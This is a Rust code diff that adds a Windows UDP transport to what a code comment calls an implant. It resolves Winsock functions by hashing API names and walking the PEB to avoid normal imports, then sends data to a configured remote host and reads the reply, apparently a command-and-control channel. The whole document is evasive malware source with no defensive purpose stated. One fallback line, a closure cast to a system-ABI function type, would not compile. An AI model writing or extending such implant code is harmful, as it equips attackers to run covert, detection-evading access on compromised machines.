@@ -322,8 +322,108 @@ impl UdpTransport {
 
 #[cfg(target_os = "windows")]
 impl Transport for UdpTransport {
-    fn request(&mut self, _data: &[u8]) -> Result<Vec<u8>, ()> {
-        Err(())
+    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
+        unsafe {
+            // 1. Load ws2_32.dll
+            let k32_hash = hash_str(b"kernel32.dll");
+            let load_lib_addr = resolve_function(k32_hash, hash_str(b"LoadLibraryA"));
+            if load_lib_addr.is_null() { return Err(()); }
+            type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
+            let load_library: FnLoadLibraryA = core::mem::transmute(load_lib_addr);
+            
+            let h_mod = load_library(b"ws2_32.dll\0".as_ptr());
+            if h_mod.is_null() { return Err(()); }
+
+            // 2. Resolve functions
+            // Note: In a real implant, we might cache these or resolving from the loaded module handle directly
+            // `resolve_function` uses PEB walking which finds loaded modules. Since we just loaded it, it should be in PEB.
+            let ws2_hash = hash_str(b"ws2_32.dll");
+            
+            let wsa_startup_addr = resolve_function(ws2_hash, hash_str(b"WSAStartup"));
+            let socket_addr = resolve_function(ws2_hash, hash_str(b"socket"));
+            let sendto_addr = resolve_function(ws2_hash, hash_str(b"sendto"));
+            let recvfrom_addr = resolve_function(ws2_hash, hash_str(b"recvfrom"));
+            let closesocket_addr = resolve_function(ws2_hash, hash_str(b"closesocket"));
+            let htobe16_addr = resolve_function(ws2_hash, hash_str(b"htons")); // htons is same as htobe16
+
+            if wsa_startup_addr.is_null() || socket_addr.is_null() || sendto_addr.is_null() 
+               || recvfrom_addr.is_null() || closesocket_addr.is_null() {
+                return Err(());
+            }
+
+            type FnWSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
+            type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> usize;
+            type FnSendTo = unsafe extern "system" fn(usize, *const u8, i32, i32, *const u8, i32) -> i32;
+            type FnRecvFrom = unsafe extern "system" fn(usize, *mut u8, i32, i32, *mut u8, *mut i32) -> i32;
+            type FnCloseSocket = unsafe extern "system" fn(usize) -> i32;
+            type FnHtons = unsafe extern "system" fn(u16) -> u16;
+
+            let wsa_startup: FnWSAStartup = core::mem::transmute(wsa_startup_addr);
+            let socket_fn: FnSocket = core::mem::transmute(socket_addr);
+            let sendto_fn: FnSendTo = core::mem::transmute(sendto_addr);
+            let recvfrom_fn: FnRecvFrom = core::mem::transmute(recvfrom_addr);
+            let closesocket_fn: FnCloseSocket = core::mem::transmute(closesocket_addr);
+            let htons_fn: FnHtons = if !htobe16_addr.is_null() {
+                 core::mem::transmute(htobe16_addr)
+            } else {
+                 // Fallback if htons not found (unlikely), simple swap
+                 |x| x.to_be()
+            };
+
+            // 3. Initialize Winsock
+            let mut wsa_data = [0u8; 400]; // Sufficient for WSADATA
+            if wsa_startup(0x0202, wsa_data.as_mut_ptr()) != 0 {
+                return Err(());
+            }
+
+            // 4. Create Socket
+            let sock = socket_fn(2, 2, 17); // AF_INET, SOCK_DGRAM, IPPROTO_UDP
+            if sock == !0usize { // INVALID_SOCKET
+                return Err(());
+            }
+
+            // 5. Prepare Address
+            // Manually parse IP
+            let mut ip_bytes = [0u8; 4];
+            let mut parts = self.host.split('.');
+            for i in 0..4 {
+                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
+            }
+            // sockaddr_in: family(2), port(2), addr(4), zero(8)
+            let mut addr = [0u8; 16];
+            addr[0] = 2; // AF_INET (u16 low byte)
+            addr[1] = 0; // AF_INET (u16 high byte)
+            let port_be = htons_fn(self.port);
+            addr[2] = (port_be & 0xFF) as u8;
+            addr[3] = (port_be >> 8) as u8;
+            addr[4] = ip_bytes[0];
+            addr[5] = ip_bytes[1];
+            addr[6] = ip_bytes[2];
+            addr[7] = ip_bytes[3];
+
+            // 6. Send
+            let sent = sendto_fn(sock, data.as_ptr(), data.len() as i32, 0, addr.as_ptr(), 16);
+            if sent < 0 {
+                closesocket_fn(sock);
+                return Err(());
+            }
+
+            // 7. Receive (with timeout?)
+            // For now, blocking. Real impl should set SO_RCVTIMEO.
+            let mut buf = [0u8; 4096];
+            let mut src_addr = [0u8; 16];
+            let mut addr_len = 16i32;
+
+            let n = recvfrom_fn(sock, buf.as_mut_ptr(), 4096, 0, src_addr.as_mut_ptr(), &mut addr_len);
+            
+            closesocket_fn(sock);
+
+            if n > 0 {
+                Ok(buf[..n as usize].to_vec())
+            } else {
+                Err(())
+            }
+        }
     }
 }
 
